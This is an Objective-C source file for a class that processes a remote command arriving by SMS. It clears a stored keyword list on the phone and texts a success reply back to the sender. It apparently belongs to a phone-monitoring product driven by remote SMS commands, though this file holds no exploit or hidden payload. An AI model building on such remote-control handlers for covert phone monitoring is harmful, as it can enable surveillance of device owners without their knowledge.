
/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearKeywordProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ClearKeywordProcessor.h"
#import "PrefKeyword.h"
#import "Preference.h"

@interface ClearKeywordProcessor (PrivateAPI)
- (void) processClearKeywords;
- (void) sendReplySMS;
@end

@implementation ClearKeywordProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearKeywordProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearKeywordProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearKeywordProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearKeywordProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearKeywordProcessor--->doProcessingCommand")
 	[self processClearKeywords];
}

#pragma mark ClearKeywordProcessor PrivateAPI Methods

/**
 - Method name: processClearKeywords
 - Purpose:This method is used to process clear keywords
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearKeywords {
	DLog (@"ClearKeywordProcessor--->processClearKeywords");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefKeyword *prefKeyword = (PrefKeyword *) [prefManager preference:kKeyword];
	NSMutableArray *keywordList=[[NSMutableArray alloc] init];
	[prefKeyword setMKeywords:keywordList];
	[prefManager savePreferenceAndNotifyChange:prefKeyword];
	[keywordList release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearKeywordProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
